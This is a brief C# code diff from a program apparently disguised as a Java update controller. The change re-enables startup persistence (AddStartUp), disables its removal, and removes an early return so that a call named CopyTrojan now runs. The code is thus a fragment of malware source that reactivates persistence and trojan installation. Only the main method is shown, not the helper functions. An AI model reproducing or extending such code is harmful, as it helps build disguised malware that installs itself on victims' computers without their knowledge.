@@ -15,9 +15,8 @@ namespace JavaUpdateController
     {
         public static void Main(string[] args)
         {
-            //Functions.AddStartUp();
-            Functions.DeleteStartUp();
-            return;
+            Functions.AddStartUp();
+            //Functions.DeleteStartUp();
             CMDCustom.CopyTrojan();
 
             retry:
